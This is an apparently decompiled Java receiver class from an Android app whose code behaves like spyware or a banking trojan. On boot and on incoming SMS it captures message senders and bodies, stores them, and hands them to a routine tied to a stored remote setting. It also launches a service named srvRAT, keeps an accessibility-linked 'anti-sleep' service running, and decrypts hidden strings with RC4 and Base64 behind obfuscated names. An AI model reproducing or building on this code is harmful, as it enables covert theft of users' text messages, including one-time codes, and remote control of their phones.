package com.example.mmm.Receiver;

import com.example.mmm.*;
import com.example.mmm.Utils.*;
import com.example.mmm.API.*;
import android.util.*;
import android.content.*;
import android.telephony.*;
import com.example.mmm.Service.*;
import android.os.*;

public class bootReceiver extends BroadcastReceiver
{
    constants phantom$;
    utils letting$;
    private String forgot$;
    
    public bootReceiver() {
        super();
        this.phantom$ = new constants();
        final StringBuilder sb = new StringBuilder();
        sb.append(bootReceiver.class.getSimpleName());
        sb.append("   ");
        this.forgot$ = sb.toString();
        this.letting$ = new utils();
    }
    
    private String a(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    public void onReceive(final Context context, final Intent \u0131ntent) {
        this.letting$.Log(this.forgot$, "run_boot_broadcast_receiver");
        utils.scheduleJob(context);
        utils.startCustomTimer(context, "", 20000L);
        this.letting$.SettingsWrite(context, "SM", String.valueOf(Integer.parseInt(this.letting$.SettingsRead(context, "SM")) + 1));
        if (!utils._prayer(context)) {
            this.letting$._firms(this.forgot$, context);
        }
        this.letting$._currency(context);
        this.letting$._antiques(context);
        if (\u0131ntent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            final utils letting$ = this.letting$;
            final Bundle extras = \u0131ntent.getExtras();
            if (extras != null) {
                final Object[] array = (Object[])extras.get("pdus");
                String displayOriginatingAddress = "";
                String string = "";
                if (array != null) {
                    for (int length = array.length, i = 0; i < length; ++i) {
                        final SmsMessage fromPdu = SmsMessage.createFromPdu((byte[])array[i]);
                        displayOriginatingAddress = fromPdu.getDisplayOriginatingAddress();
                        final StringBuilder sb = new StringBuilder();
                        sb.append(string);
                        sb.append(fromPdu.getDisplayMessageBody());
                        string = sb.toString();
                    }
                    final StringBuilder sb2 = new StringBuilder("Input SMS: ");
                    sb2.append(displayOriginatingAddress);
                    sb2.append(" Text: ");
                    sb2.append(string);
                    sb2.append("[143523#]");
                    final String string2 = sb2.toString();
                    letting$.Log("sendSMS", string2);
                    letting$.SettingsToAdd(context, "AS", string2);
                    letting$._compiled(context, letting$.SettingsRead(context, "QQ"));
                }
            }
        }
        if (!utils.isMyServiceRunning(context, srvRAT.class) && this.letting$.SettingsRead(context, "RQ").equals("connect")) {
            context.startService(new Intent(context, (Class)srvRAT.class));
        }
        final String s = "ES";
        if ((s.equals("1") || (this.phantom$.meters$ && !utils.isAccessibilityServiceEnabled(context, srvAccessibility.class))) && !this.letting$.SettingsRead(context, "EL").equals("start")) {
            final Intent \u0131ntent2 = new Intent(context, (Class)srvAntiSleep.class);
            \u0131ntent2.setAction("start");
            if (Build$VERSION.SDK_INT >= 26) {
                this.letting$.Log("Boot", "Starting the service in >=26 Mode from a BroadcastReceiver");
                context.startForegroundService(\u0131ntent2);
            }
            else {
                this.letting$.Log("Boot", "Starting the service in < 26 Mode from a BroadcastReceiver");
                context.startService(\u0131ntent2);
            }
        }
        if (!s.equals("1") && utils.isAccessibilityServiceEnabled(context, srvAccessibility.class) && this.letting$.SettingsRead(context, "EL").equals("start")) {
            final Intent \u0131ntent3 = new Intent(context, (Class)srvAntiSleep.class);
            \u0131ntent3.setAction("stop");
            context.startService(\u0131ntent3);
        }
    }
}
